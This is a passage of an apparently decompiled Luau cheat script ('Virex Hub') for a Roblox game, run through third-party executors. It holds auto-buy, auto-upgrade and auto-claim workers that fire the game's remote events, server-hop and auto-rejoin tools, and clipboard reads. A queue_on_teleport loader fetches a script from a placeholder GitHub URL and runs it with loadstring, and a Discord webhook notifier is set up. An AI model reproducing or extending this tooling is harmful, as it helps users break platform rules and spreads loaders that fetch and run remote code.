local v15 = paint2(color2.Text, string.format("%d/3 loaded", #arg2.Items))
tbl24[1] = v14
tbl24[2] = v15
tbl24[3] = v13
tbl23.Text = concat(tbl24, "\n")
set(tbl23)
end
local function refreshFuse()
if not v11 then
return
end
n24 = 2
table.clear(tbl21)
local n25 = 0
local function fn32(arg, arg2)
n25 += 1
local v13 = fn28(n25)
v13.Set({ Visible = true, Text = arg })
table.insert(tbl21, { Kind = "text", Handle = v13, Gap = arg2 })
end
local function fn33(arg, arg2)
local flag3 = #tbl21 > 0
fn32(string.format("<b><font color=\"%s\">%s</font></b>", arg2, arg), flag3)
end
local v13 = fn20()
local n26
if not v13 then
fn31(nil, nil)
fn32(bold2(paint2(color2.Hint, "Fuse machine data is not available yet")), false)
n26 = 0
elseif #v13.Items == 0 then
fn31(nil, nil)
fn32(bold2(paint2(color2.Text, "Machine is empty")), false)
fn32(paint2(color2.Hint, "Load 3 pets of the same species to see the result odds"), false)
n26 = 0
else
local items = v13.Items
local v14 = tbl12.AssetInfo(items[1].Category)
fn31(v14, v13)
local text = color2.Text
fn33(string.format("FUSE MACHINE STATUS (%d/3 PETS)", #items), text)
fn32(paint2(color2.Hint, "Species") .. "  " .. bold2(paint2(v14.Hex, "[" .. string.upper(tostring(v14.Rarity)) .. "]")) .. " " .. bold2(paint2(color2.Text, tbl12.Escape(v14.Name))), false)
n26 = 0
for i = 1, 3 do
local v15 = items[i]
n26 += 1
local v16 = fn29(n26)
v16.Frame.Set({ Visible = true })
v16.Status.Set({ Text = "SLOT " .. i })
if v15 then
v16.Icon.Set({ Visible = v14.Icon ~= nil, Image = v14.Icon or "", StrokeColor = v14.Color })
v16.Name.Set({ Text = tbl12.Escape(v14.Name) })
v16.Rarity.Set({
Text = string.upper(tostring(v14.Rarity)),
Color = fn22(v14),
Gradient = fn21(v14),
GradientRotation = fn23(v14),
})
local v17 = fn16(v15.Category, v15.Scale)
local v18 = bold2(paint2(color2.Scale, string.format("%.2fx", v15.Scale)))
if v17 then
v18 ..= tbl12.Separator() .. paint2(color2.Weight, tbl12.FormatWeight(v17))
end
local str = v18 .. tbl12.Separator() .. bold2(paint2(color2.Income, tbl12.FormatRate(tbl12.Income(v14, v15.Scale, v15.Mutations))))
local v19 = tbl12.MutationText(v15.Mutations)
v16.Detail.Set({
Text = str .. tbl12.Separator() .. (v19 ~= "" and v19 or paint2(color2.Hint, "Normal")),
})
else
v16.Icon.Set({ Visible = false })
v16.Name.Set({ Text = paint2(color2.Hint, "Empty") })
v16.Rarity.Set({ Text = "", Gradient = nil })
v16.Detail.Set({ Text = paint2(color2.Hint, "Add a pet to this slot") })
end
table.insert(tbl21, { Kind = "slot", Slot = v16 })
end
local n27 = 0
for _, item in ipairs(items) do
n27 += item.Scale
end
local n28 = n27 / #items
local v15 = fn16(items[1].Category, n28)
local str = paint2(color2.Hint, "Average Scale") .. "  " .. bold2(paint2(color2.Scale, string.format("%.2fx", n28)))
if v15 then
str ..= tbl12.Separator() .. paint2(color2.Weight, tbl12.FormatWeight(v15))
end
fn32(str, false)
local v16 = nil
for _, item in ipairs(items) do
local v17 = fn17(item.Mutations)
if v17 then
if (v16 and tbl12.MutationMultiplier({ v16 }) or 0) < tbl12.MutationMultiplier({ v17 }) then
v16 = v17
end
end
end
local tbl23 = v16 and { v16 } or {}
fn33("PREDICTED SIZE PROBABILITIES", color2.Income)
if #items == 3 then
local tbl24 = { items[1].Scale, items[2].Scale, items[3].Scale }
local tbl25 = {}
local n29 = 0
for _, v17 in ipairs(fn18()) do
local n30 = v17.weight * fn19(tbl24, v17.min, v17.max)
n29 += n30
table.insert(tbl25, { Min = v17.min, Max = v17.max, Weight = n30, Color = fn15(v17.min) })
end
table.sort(tbl25, function(arg, arg2)
return arg.Weight > arg2.Weight
end)
local v17 = tbl25[1]
for _, v18 in ipairs(tbl25) do
local n30 = n29 > 0 and v18.Weight / n29 * 100 or 0
local v19 = bold2(paint2(v18.Color, string.format("%.2fx - %.2fx", v18.Min, v18.Max)))
local v20 = fn16(items[1].Category, v18.Min)
local v21 = fn16(items[1].Category, v18.Max)
if v20 and v21 then
local weight = color2.Weight
local format = string.format
local formatWeight = tbl12.FormatWeight
v19 ..= tbl12.Separator() .. paint2(weight, format("%s - %s", tbl12.FormatWeight(v20), formatWeight(v21)))
end
local v22 = tbl12.Separator()
local income = n30 >= 10 and color2.Income
if not income then
income = n30 >= 1 and color2.Clock or color2.Hint
end
fn32(v19 .. v22 .. bold2(paint2(income, string.format(n30 >= 1 and "%.1f%%" or "%.3f%%", n30))), false)
end
fn33("RESULT PREDICTION", color2.Text)
fn32(paint2(color2.Hint, "Predicted Mutation") .. "  " .. (v16 and tbl12.MutationText(tbl23) or paint2(color2.Text, "Normal")), false)
if v17 then
fn32(paint2(color2.Hint, "Estimated Value") .. "  " .. bold2(paint2(color2.Income, tbl12.FormatRate(tbl12.Income(v14, v17.Min, tbl23)) .. " ~ " .. tbl12.FormatRate(tbl12.Income(v14, v17.Max, tbl23)))) .. tbl12.Separator() .. paint2(color2.Hint, "at ") .. bold2(paint2(v17.Color, string.format("%.2fx - %.2fx", v17.Min, v17.Max))), false)
end
local v18, v19, v20 = ipairs(tbl25)
local v21 = nil
for _, v22 in v18, v19, v20 do
if not v21 or v22.Max > v21.Max then
v21 = v22
end
end
if v21 then
fn32(paint2(color2.Hint, "Best Case") .. "  " .. bold2(paint2(v21.Color, string.format("%.2fx - %.2fx", v21.Min, v21.Max))) .. "  " .. bold2(paint2(color2.Income, tbl12.FormatRate(tbl12.Income(v14, v21.Max, tbl23)))), false)
end
else
fn32(paint2(color2.Hint, string.format("Load %d more of the same species to see the odds", 3 - #v13.Items)), false)
end
end
for i = n25 + 1, #tbl20 do
tbl20[i].Set({ Visible = false })
end
for i = n26 + 1, #tbl19 do
tbl19[i].Frame.Set({ Visible = false })
end
fn30()
n24 = 2
end
if not tbl12.Ready then
v9:CreateText({ Name = "Fuse Predictor", Text = "Predictor preview card needs a canvas-capable Virex UI." })
else
local v13 = v9:CreateCanvas({
Name = "Fuse Predictor",
Layout = "free",
Style = {
TextScale = 0.84,
LineHeight = 1.1,
MinLines = 16,
MaxLines = 34,
BackgroundTransparency = 0.5,
ScrollBarColor = Color3.fromRGB(170, 174, 184),
TextColor = Color3.fromRGB(255, 255, 255),
TextStrokeTransparency = 0.7,
},
Build = function(arg)
fn24(arg)
if type(tbl12.RequestEggRefresh) == "function" then
tbl12.RequestEggRefresh()
end
end,
})
tbl12.RefreshFuse = refreshFuse
tbl12.PlaceFuse = function()
if n24 > 0 or flag2 then
if n24 > 0 then
n24 -= 1
end
pcall(fn30)
end
end
fn4(function()
v13:Destroy()
end)
end
end
local v11
v11 = v2:CreateTab({ Name = "Boosts", SectionsExpanded = true }):CreateSection({ Name = "Auto Progression", Expanded = true })
do
local tbl17 = {}
local tbl18
tbl18 = {
Remote = function(arg)
local v12 = tbl17[arg]
if v12 ~= nil then
return v12 or nil
end
local v13 = networking:FindFirstChild(arg)
tbl17[arg] = v13 or false
return v13
end,
Invoke = function(arg, ...)
local v12 = tbl18.Remote(arg)
if not v12 or not v12:IsA("RemoteFunction") then
return false, nil
end
local ok, result = pcall(v12.InvokeServer, v12, ...)
return ok, result
end,
Fire = function(arg, ...)
local v12 = tbl18.Remote(arg)
if not v12 or not v12:IsA("RemoteEvent") then
return false
end
return pcall(v12.FireServer, v12, ...)
end,
}
local function saveData()
local save = tbl.Save
if type(save) ~= "table" or type(save.Get) ~= "function" then
return nil
end
local ok, result = pcall(save.Get)
return ok and type(result) == "table" and result or nil
end
tbl18.SaveData = saveData
local tbl19 = { "Money", "Cash", "Coins", "Currency", "Balance" }
tbl18.Money = function()
local v12 = saveData()
if v12 then
for _, v13 in ipairs(tbl19) do
local num = tonumber(v12[v13])
if num then
return num
end
end
end
local leaderstats = localPlayer:FindFirstChild("leaderstats")
if leaderstats then
for _, v13 in ipairs(tbl19) do
local v14 = leaderstats:FindFirstChild(v13)
if v14 and tonumber(v14.Value) then
return tonumber(v14.Value)
end
end
end
return nil
end
tbl18.AddWorker = tbl3.Add
tbl18.Backoff = tbl3.Backoff
local tbl20 = {
"Money",
"BaseUpgradeLevel",
"TreadmillUpgradeLevel",
"TrailInventory",
"PendingOfflineMoney",
}
local save = tbl.Save
if type(save) == "table" and type(save.FieldSignal) == "function" then
for _, v12 in ipairs(tbl20) do
local ok, result = pcall(save.FieldSignal, v12)
if ok and type(result) == "table" and type(result.Connect) == "function" then
local ok2, result2 = pcall(result.Connect, result, function()
tbl3.Wake()
end)
if ok2 and result2 then
fn4(function()
pcall(function()
result2:Disconnect()
end)
end)
end
end
end
end
local v12 = nil
local v13 = nil
local tbl21 = {}
local function fn15()
local v14 = fn2(function()
return ReplicatedStorage.Data.Trails
end)
local directory = type(v14) == "table" and v14.Directory or nil
if type(directory) ~= "table" then
return {}
end
local tbl22 = {}
for k, v15 in pairs(directory) do
if type(v15) == "table" then
local insert = table.insert
local tbl23 = {}
local v16 = tostring
k = v15._id or k
tbl23.Id = v16(k)
tbl23.Price = tonumber(v15.Price) or math.huge
insert(tbl22, tbl23)
end
end
table.sort(tbl22, function(arg, arg2)
return arg.Price < arg2.Price
end)
return tbl22
end
local function fn16(arg)
if not tbl6.ReadToggle(v12, false) then
return false
end
v13 = v13 or fn15()
local v14 = tbl18.SaveData()
if not v14 or #v13 == 0 then
return false
end
local trailInventory = type(v14.TrailInventory) == "table" and v14.TrailInventory or {}
local n13 = tonumber(v14.Money) or 0
for _, v15 in ipairs(v13) do
if trailInventory[v15.Id] ~= true and not tbl21[v15.Id] and v15.Price <= n13 then
local AskPurchase, v16 = tbl18.Invoke("RF/Trailwear/AskPurchase", v15.Id)
if AskPurchase and v16 ~= false then
return true
end
tbl21[v15.Id] = true
tbl18.Backoff(arg)
return false
end
end
return false
end
v12 = v11:CreateToggle({
Name = "Auto Buy Trail",
Note = "Automatically buy available trails when affordable",
Default = false,
Callback = function()
table.clear(tbl21)
v13 = nil
end,
})
tbl18.AddWorker(fn16)
local v14 = nil
local function fn17()
if not tbl6.ReadToggle(v14, false) then
return false
end
local v15 = tbl18.SaveData()
if not v15 then
return false
end
local v16 = fn2(function()
return ReplicatedStorage.Data.Bases
end)
local bases = type(v16) == "table" and v16.BASES or nil
if type(bases) ~= "table" then
return false
end
local n13 = tonumber(v15.BaseUpgradeLevel) or 0
local ok = nil
if type(v16.GetMaxBaseLevel) == "function" then
local result
ok, result = pcall(v16.GetMaxBaseLevel)
ok = ok and tonumber(result) or nil
end
if ok and n13 >= ok then
return false
end
local v17 = bases[n13 + 1]
local num = type(v17) == "table" and tonumber(v17.Cost) or nil
if num then
num = (tonumber(v15.Money) or 0) >= num
end
if num then
return tbl18.Fire("RE/Homestead/AskBaseTierRaise")
end
return false
end
v14 = v11:CreateToggle({
Name = "Auto Upgrade Base",
Note = "Automatically upgrade base when money is available",
Default = false,
})
tbl18.AddWorker(fn17)
local v15 = nil
local function fn18()
if not tbl6.ReadToggle(v15, false) then
return false
end
local v16 = tbl18.SaveData()
if not v16 then
return false
end
local v17 = fn2(function()
return ReplicatedStorage.Data.Treadmills
end)
if type(v17) ~= "table" or type(v17.GetByUpgradeLevel) ~= "function" then
return false
end
local ok, result = pcall(v17.GetByUpgradeLevel, (tonumber(v16.TreadmillUpgradeLevel) or 0) + 1)
if not ok or type(result) ~= "table" then
return false
end
local id = result._id
local huge = tonumber(result.Price) or math.huge
local flag2 = type(id) == "string"
if flag2 then
flag2 = (tonumber(v16.Money) or 0) >= huge
end
if flag2 then
local AskTierRaise, v18 = tbl18.Invoke("RF/Treadmill/AskTierRaise", id)
return AskTierRaise and v18 ~= false
end
return false
end
v15 = v11:CreateToggle({
Name = "Auto Upgrade Treadmill",
Note = "Automatically upgrade treadmill when money is available",
Default = false,
})
tbl18.AddWorker(fn18)
local n13 = 15
local v16 = nil
local n14 = 15
local now = os.clock()
local function fn19()
if not tbl6.ReadToggle(v16, false) then
return false
end
local now2 = os.clock()
n14 += now2 - now
now = now2
local v17 = tbl18.SaveData()
local num = v17 and tonumber(v17.PendingOfflineMoney) or nil
if num == nil then
local v18
num, v18 = tbl18.Invoke("RF/AwayEarnings/PendingCheck")
num = num and v18 ~= false and v18 ~= nil and 1 or 0
end
local flag2 = num > 0
local flag3 = false
if flag2 then
local v18
flag3, v18 = tbl18.Invoke("RF/AwayEarnings/AskCollect")
flag3 = flag3 and v18 ~= false
end
if n14 >= n13 then
n14 = 0
local AskRedeemAll, v18 = tbl18.Invoke("RF/Codex/AskRedeemAll")
flag3 = flag3 or AskRedeemAll and v18 ~= false
tbl18.Invoke("RF/Codex/AskRedeemLimitedEgg")
end
return flag3
end
v16 = v11:CreateToggle({
Name = "Auto Claim",
Note = "Claim offline money & index rewards",
Default = false,
Callback = function()
n14 = n13
end,
})
tbl18.AddWorker(fn19)
end
tbl4.IndexClaimHandle = v11:CreateToggle({
Name = "Auto Claim Index",
Note = "Claim index rewards as soon as they unlock",
Default = false,
Callback = function()
if type(tbl4.IndexClaimRestart) == "function" then
tbl4.IndexClaimRestart()
end
end,
})
local fn15
fn15 = function(arg, arg2)
if type(v.Notify) == "function" then
pcall(v.Notify, arg, arg2, 5)
end
end
local v12
v12 = v2:CreateTab({ Name = "Server", SectionsExpanded = true }):CreateSection({ Name = "Server", Expanded = true })
local TeleportService
TeleportService = game:GetService("TeleportService")
local HttpService
HttpService = game:GetService("HttpService")
local GuiService
GuiService = game:GetService("GuiService")
do
local function fn16()
if type(queue_on_teleport) == "function" then
return queue_on_teleport
end
if type(queueonteleport) == "function" then
return queueonteleport
end
if type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
return syn.queue_on_teleport
end
if type(fluxus) == "table" and type(fluxus.queue_on_teleport) == "function" then
return fluxus.queue_on_teleport
end
return nil
end
local function fn17(arg)
pcall(function()
TeleportService:SetTeleportSetting("__VirexAutoLoadScriptEnabled", arg)
end)
if not arg then
return true
end
local v13 = fn16()
if not v13 then
return false
end
if rawget(_G, "__VirexAutoLoadQueued") ~= true then
if not pcall(v13, [[local TeleportService = game:GetService("TeleportService")
local enabled = true
pcall(function()
enabled = TeleportService:GetTeleportSetting("__VirexAutoLoadScriptEnabled") == true
end)
if enabled then
if not game:IsLoaded() then
game.Loaded:Wait()
end
pcall(function()
local player = game:GetService("Players").LocalPlayer
if player and not player.Character then
player.CharacterAdded:Wait()
end
end)
task.wait(1.5)
local ok, source = pcall(function()
return game:HttpGet("https://raw.githubusercontent.com/TU_USUARIO/TU_REPO/main/virex_hub.lua")
end)
if ok and type(source) == "string" then
local chunk = loadstring(source)
if chunk then
chunk()
end
end
end
]]) then
return false
end
_G.__VirexAutoLoadQueued = true
end
return true
end
local v13 = nil
local function fn18()
if v13 and tbl4.Toggle(v13, false) then
fn17(true)
end
end
v13 = v12:CreateToggle({
Name = "Auto Load Script",
Default = true,
Callback = function(arg)
local flag2 = arg == true
if not fn17(flag2) and flag2 then
task.defer(function()
fn17(false)
if v13 and type(v13.Set) == "function" then
pcall(v13.Set, v13, false, false)
end
fn15("Auto Load Unavailable", "This executor does not support queue on teleport.")
end)
end
end,
})
local str = "Least Players"
local n13 = 10
local n14 = 0
local v14 = nil
local tbl17 = {}
local flag2 = false
local n15 = 0
local flag3 = false
local v15 = nil
local str2 = ""
local n16 = 0
local n17 = 60
local function fn19(arg)
n14 = 0
v14 = nil
if arg then
tbl17[arg] = true
end
end
pcall(function()
TeleportService.TeleportInitFailed:Connect(function(arg, arg2, arg3)
if not v14 then
return
end
fn19(v14)
flag3 = true
if not flag2 then
fn15("Server Hop Failed", tostring(arg3 ~= "" and arg3 or arg2))
end
end)
end)
local function fn20(arg)
local str3 = tostring(game.JobId or "")
local tbl18 = {}
local flag4 = arg == "Random"
local str4 = arg == "Least Players" and "Asc" or "Desc"
local n18 = flag4 and 3 or 6
local nextPageCursor = nil
for i = 1, n18 do
local str5 = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&excludeFullGames=true&limit=100", game.PlaceId, str4)
if nextPageCursor and nextPageCursor ~= "" then
str5 ..= "&cursor=" .. HttpService:UrlEncode(nextPageCursor)
end
local ok, result = pcall(function()
return HttpService:JSONDecode(game:HttpGet(str5))
end)
if not ok or type(result) ~= "table" then
return tbl18, false
end
local v16 = ipairs
local data = result.data or {}
for _, v17 in v16(data) do
local str6 = tostring(v17.id or "")
local huge = tonumber(v17.playing) or math.huge
local n19 = tonumber(v17.maxPlayers) or 0
if str6 ~= "" and str6 ~= str3 and huge < n19 then
tbl18[#tbl18 + 1] = { Id = str6, Playing = huge, Room = n19 - huge }
end
end
if #tbl18 > 0 and not flag4 then
break
end
nextPageCursor = result.nextPageCursor
if not nextPageCursor or nextPageCursor == "" then
break
end
end
return tbl18, true
end
local function serverHop(arg)
local v16
if v15 and str2 == arg and os.clock() - n16 < n17 then
v16 = v15
else
local v17
v16, v17 = fn20(arg)
if not v17 then
return "fetch"
end
v15 = v16
str2 = arg
n16 = os.clock()
end
local function fn21(arg2)
local tbl18 = {}
for _, v17 in ipairs(v16) do
if not tbl17[v17.Id] and v17.Room >= arg2 then
tbl18[#tbl18 + 1] = v17
end
end
return tbl18
end
local v17 = fn21(2)
if #v17 == 0 then
v17 = fn21(1)
end
if #v17 == 0 and next(tbl17) ~= nil then
table.clear(tbl17)
v17 = fn21(1)
end
if #v17 == 0 then
fn19(nil)
v15 = nil
return "empty"
end
local id
if arg == "Random" then
id = v17[math.random(1, #v17)].Id
else
table.sort(v17, function(arg2, arg3)
if arg == "Least Players" then
return arg2.Playing < arg3.Playing
end
return arg2.Playing > arg3.Playing
end)
id = v17[1].Id
end
flag3 = false
v14 = id
n14 = os.clock() + n13
pcall(fn18)
if not pcall(function()
TeleportService:TeleportToPlaceInstance(game.PlaceId, id, localPlayer)
end) then
fn19(id)
return "failed"
end
local n18 = os.clock() + n13
while os.clock() < n18 do
if flag3 then
return "denied"
end
task.wait(0.25)
end
return "waiting"
end
tbl4.ServerHop = serverHop
v12:CreateDropdown({
Name = "Server Hop Mode",
Options = { "Most Players", "Random", "Least Players" },
Default = "Least Players",
Callback = function(arg)
str = tostring(arg or "Least Players")
end,
})
v12:CreateButton({
Name = "Server Hop",
ButtonText = "Hop",
Callback = function()
n15 += 1
local v16 = n15
task.spawn(function()
flag2 = true
local n18 = 0
while v16 == n15 do
n18 += 1
local v17 = serverHop(str)
if not (v17 == "waiting" or v16 ~= n15) then
if v17 == "empty" then
v15 = nil
table.clear(tbl17)
end
if n18 % 10 == 0 then
fn15("Server Hop", string.format("Every server was full so far, %d tries.", n18))
end
task.wait(v17 == "fetch" and 1 or 0.1)
continue
end
break
end
if v16 == n15 then
flag2 = false
end
end)
end,
})
end
do
local n13 = 8
local n14 = 0
local str = ""
local v13 = nil
local function fn16()
return os.clock() < n14
end
local function fn17(arg)
n14 = arg and os.clock() + n13 or 0
end
local function fn18(arg)
local match = tostring(arg or ""):match("^%s*(.-)%s*$")
return match:match("%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x") or match
end
local function fn19()
local v14 = str
local result = str
if v13 then
local ok
ok, result = pcall(function()
local controller = v13._controller
return controller and controller.GetValue and controller.GetValue()
end)
if not (ok and type(result) == "string" and result ~= "") then
local exitTo = nil
for _, v15 in ipairs({ "Get", "GetValue", "GetText" }) do
local ok2, result2 = pcall(function()
return v13[v15]
end)
if ok2 and type(result2) == "function" then
local ok3
ok3, result = pcall(result2, v13)
if ok3 and type(result) == "string" and result ~= "" then
exitTo = 1
break
end
end
end
if exitTo ~= 1 then
result = v14
end
end
end
local v15 = fn18(result)
if v15 == "" then
local ok, result2 = pcall(function()
local v16 = getclipboard or readclipboard or getrbxclipboard
return type(v16) == "function" and v16() or nil
end)
if ok and type(result2) == "string" then
v15 = fn18(result2)
end
end
return v15
end
local function fn20(arg)
if not v13 then
return
end
pcall(function()
local controller = v13._controller
if controller and controller.SetValue then
controller.SetValue(arg, false)
end
end)
str = fn18(arg)
end
local function fn21(arg)
fn17(true)
pcall(AutoLoadBeforeTeleport)
if not pcall(function()
if game.JobId ~= "" then
TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
else
TeleportService:Teleport(game.PlaceId, localPlayer)
end
end) then
fn17(false)
fn15(arg, "Roblox could not rejoin the server.")
end
end
pcall(function()
TeleportService.TeleportInitFailed:Connect(function(arg, arg2, arg3)
if not fn16() then
return
end
fn17(false)
fn15("Teleport Failed", tostring(arg3 ~= "" and arg3 or arg2))
end)
end)
v13 = v12:CreateInput({
Name = "Job ID",
Placeholder = "Paste a server Job ID...",
Default = "",
MaxLength = 100,
Callback = function(arg)
str = fn18(arg)
end,
})
if v13 then
v13._configIgnored = true
if v13.State and not v13.State._registered then
v13.State._configIgnored = true
end
end
v12:CreateButton({
Name = "Join Job ID",
ButtonText = "Join",
Callback = function()
if fn16() then
fn15("Join Job ID Failed", "A teleport is already running, try again shortly.")
return
end
local v14 = fn19()
if v14 == "" then
fn15("Join Job ID Failed", "Paste a valid Job ID first.")
return
end
fn17(true)
pcall(AutoLoadBeforeTeleport)
if not pcall(function()
TeleportService:TeleportToPlaceInstance(game.PlaceId, v14, localPlayer)
end) then
fn17(false)
fn15("Join Job ID Failed", "Roblox could not join that server.")
end
end,
})
v12:CreateButton({
Name = "Copy Current Job ID",
ButtonText = "Copy",
Callback = function()
local str2 = tostring(game.JobId or "")
fn20(str2)
local v14 = setclipboard or toclipboard
fn15((type(v14) == "function" and pcall(v14, str2) or false) and "Job ID Copied" or "Job ID Shown", str2)
end,
})
v12:CreateButton({
Name = "Rejoin Server",
ButtonText = "Rejoin",
Callback = function()
if fn16() then
fn15("Rejoin Failed", "A teleport is already running, try again shortly.")
return
end
fn21("Rejoin Failed")
end,
})
local tbl17 = { Option = nil, Fired = false, TeleportingAt = 0 }
local function fn22()
local robloxPromptGui = CoreGui:FindFirstChild("RobloxPromptGui")
local promptOverlay = robloxPromptGui and robloxPromptGui:FindFirstChild("promptOverlay")
return promptOverlay ~= nil and promptOverlay:FindFirstChild("ErrorPrompt") ~= nil
end
pcall(function()
local connection = localPlayer.OnTeleport:Connect(function(arg)
if arg == Enum.TeleportState.Failed then
tbl17.TeleportingAt = 0
else
tbl17.TeleportingAt = os.clock()
end
end)
fn4(function()
pcall(function()
connection:Disconnect()
end)
end)
end)
tbl17.Option = v12:CreateToggle({ Name = "Auto Rejoin When Disconnect", Default = true })
local function fn23(arg)
if tbl17.Fired or tbl17.Option == nil or not tbl4.Toggle(tbl17.Option, false) or fn16() then
return
end
local flag2 = tbl17.TeleportingAt > 0
if flag2 then
local teleportingAt = tbl17.TeleportingAt
flag2 = os.clock() - teleportingAt < 60
end
if flag2 then
return
end
local v14 = string.lower(tostring(arg or ""))
if v14 == "" or string.find(v14, "teleport", 1, true) then
return
end
local errorCode = nil
pcall(function()
errorCode = GuiService:GetErrorCode()
end)
if errorCode == Enum.ConnectionError.DisconnectDuplicatePlayer or string.find(v14, "banned", 1, true) or string.find(v14, "same account", 1, true) then
return
end
tbl17.Fired = true
local placeId = game.PlaceId
local str2 = tostring(game.JobId or "")
local flag3 = string.find(v14, "shut", 1, true) ~= nil or string.find(v14, "no longer", 1, true) ~= nil or string.find(v14, "closed", 1, true) ~= nil
pcall(AutoLoadBeforeTeleport)
fn15("Auto Rejoin", flag3 and "Server closed, joining another one." or "Disconnected, rejoining now.")
task.spawn(function()
local n15 = 0
while true do
n15 += 1
local flag4 = not flag3 and str2 ~= "" and n15 <= 2
pcall(function()
if flag4 then
TeleportService:TeleportToPlaceInstance(placeId, str2, localPlayer)
else
TeleportService:Teleport(placeId, localPlayer)
end
end)
task.wait(flag4 and 4 or 5)
end
end)
end
pcall(function()
local connection = GuiService.ErrorMessageChanged:Connect(function(arg)
task.wait(0.3)
if fn22() then
fn23(arg)
end
end)
fn4(function()
pcall(function()
connection:Disconnect()
end)
end)
end)
task.spawn(function()
local robloxPromptGui = CoreGui:WaitForChild("RobloxPromptGui", 30)
robloxPromptGui = robloxPromptGui and robloxPromptGui:WaitForChild("promptOverlay", 30)
if not robloxPromptGui then
return
end
local connection = robloxPromptGui.ChildAdded:Connect(function(child)
if child.Name ~= "ErrorPrompt" then
return
end
task.wait(0.2)
local str2 = ""
for _, descendant in ipairs(child:GetDescendants()) do
if descendant:IsA("TextLabel") and descendant.Name == "ErrorMessage" then
str2 = descendant.Text
end
end
if str2 == "" then
pcall(function()
str2 = GuiService:GetErrorMessage()
end)
end
fn23(str2 ~= "" and str2 or "disconnected")
end)
fn4(function()
pcall(function()
connection:Disconnect()
end)
end)
end)
end
do
local AssetService = game:GetService("AssetService")
local request_ = syn and syn.request or http and http.request or http_request or request
local tbl17 = {
Url = "",
Stolen = false,
PingEveryone = false,
Queue = {},
Sending = false,
Notified = {},
Icons = {},
Pngs = {},
Crc = {},
Known = nil,
Carry = nil,
Avatar = nil,
Disposed = false,
Path = "VirexHub/SAE_Webhook.txt",
Saved = "",
LoadedAt = os.clock(),
Input = nil,
Dot = "  " .. utf8.char(183) .. "  ",
MaxSide = 200,
Logo = "rbxassetid://107391174248131",
Emoji = {
Value = "<:sae_value:1551645680718581871>",
Size = "<:sae_size:1551645444285800558>",
Mutation = "<:sae_mutation:1551677914146275478>",
Area = "<:sae_area:1551675973328441416>",
},
}
pcall(function()
if type(readfile) ~= "function" then
return
end
if type(isfile) == "function" and not isfile(tbl17.Path) then
return
end
local v13 = string.gsub(tostring(readfile(tbl17.Path) or ""), "%s", "")
tbl17.Saved = v13
tbl17.Url = v13
end)
for i = 0, 255 do
local v13 = i
for i2 = 1, 8 do
if bit32.band(v13, 1) == 1 then
v13 = bit32.bxor(3988292384, bit32.rshift(v13, 1))
else
v13 = bit32.rshift(v13, 1)
end
end
tbl17.Crc[i] = v13
end
local function fn16(arg)
if type(arg) ~= "string" then
return false
end
for _, v13 in ipairs({ "discord%.com", "discordapp%.com", "ptb%.discord%.com", "canary%.discord%.com" }) do
if string.match(arg, "^https://" .. v13 .. "/api/webhooks/%d+/[%w%-_]+$") then
return true
end
end
return false
end
local function fn17(arg)
if type(request_) ~= "function" then
return nil
end
local ok, result = pcall(request_, { Url = arg, Method = "GET" })
if not ok or type(result) ~= "table" or tonumber(result.StatusCode) ~= 200 then
return nil
end
local ok2, result2 = pcall(HttpService.JSONDecode, HttpService, tostring(result.Body))
return ok2 and result2 or nil
end
local function fn18(arg, arg2)
local flag2 = type(arg) == "table" and type(arg.data) == "table" and arg.data[1] or nil
if type(flag2) ~= "table" or flag2.state ~= "Completed" or type(flag2.imageUrl) ~= "string" or flag2.imageUrl == "" then
return nil
end
if arg2 and not string.find(flag2.imageUrl, "/Image/", 1, true) then
return nil
end
return flag2.imageUrl
end
local function fn19(arg)
if tbl17.Icons[arg] == nil then
tbl17.Icons[arg] = fn18(fn17("https://thumbnails.roblox.com/v1/assets?assetIds=" .. arg .. "&returnPolicy=PlaceHolder&size=420x420&format=Png&isCircular=false"), true) or false
end
return tbl17.Icons[arg] or nil
end
local function fn20()
if tbl17.Avatar == nil then
tbl17.Avatar = fn18(fn17("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. localPlayer.UserId .. "&size=150x150&format=Png&isCircular=false")) or false
end
return tbl17.Avatar or nil
end
local function fn21(arg, arg2, arg3)
local crc = tbl17.Crc
local n13 = 4294967295
for i = arg2, arg3 do
local rshift = bit32.rshift
n13 = bit32.bxor(crc[bit32.band(bit32.bxor(n13, buffer.readu8(arg, i)), 255)], rshift(n13, 8))
end
return bit32.bxor(n13, 4294967295)
end
local function fn22(arg, arg2, arg3)
local n13 = arg2 * 4 + 1
local n14 = n13 * arg3
local n15 = 2 + math.ceil(n14 / 65535) * 5 + n14 + 4
local v13 = buffer.create(45 + n15 + 12)
local n16 = 0
local function fn23(arg4)
buffer.writeu8(v13, n16, arg4)
n16 += 1
end
local function fn24(arg4)
fn23(bit32.band(bit32.rshift(arg4, 24), 255))
fn23(bit32.band(bit32.rshift(arg4, 16), 255))
fn23(bit32.band(bit32.rshift(arg4, 8), 255))
fn23(bit32.band(arg4, 255))
end
local function fn25(arg4, arg5, arg6, arg7)
fn23(arg4)
fn23(arg5)
fn23(arg6)
fn23(arg7)
end
for _, v14 in ipairs({ 137, 80, 78, 71, 13, 10, 26, 10 }) do
fn23(v14)
end
fn24(13)
fn25(73, 72, 68, 82)
fn24(arg2)
fn24(arg3)
fn23(8)
fn23(6)
fn23(0)
fn23(0)
fn23(0)
fn24(fn21(v13, n16, n16 - 1))
local v14 = buffer.create(n14)
for i = 0, arg3 - 1 do
buffer.writeu8(v14, i * n13, 0)
buffer.copy(v14, i * n13 + 1, arg, i * arg2 * 4, arg2 * 4)
end
fn24(n15)
local v15 = n16
fn25(73, 68, 65, 84)
fn23(120)
fn23(1)
local n17 = 0
while n17 < n14 do
local n18 = math.min(65535, n14 - n17)
fn23(n17 + n18 >= n14 and 1 or 0)
fn23(bit32.band(n18, 255))
fn23(bit32.rshift(n18, 8))
local v16 = bit32.band(bit32.bnot(n18), 65535)
fn23(bit32.band(v16, 255))
fn23(bit32.rshift(v16, 8))
buffer.copy(v13, n16, v14, n17, n18)
n16 += n18
n17 += n18
end
local n18 = 1
local n19 = 0
for i = 0, n14 - 1 do
n18 = (n18 + buffer.readu8(v14, i)) % 65521
n19 = (n19 + n18) % 65521
end
fn24(n19 * 65536 + n18)
fn24(fn21(v13, v15, n16 - 1))
fn24(0)
fn25(73, 69, 78, 68)
fn24(fn21(v13, n16, n16 - 1))
return buffer.tostring(v13)
end
local function fn23(arg)
if tbl17.Pngs[arg] ~= nil then
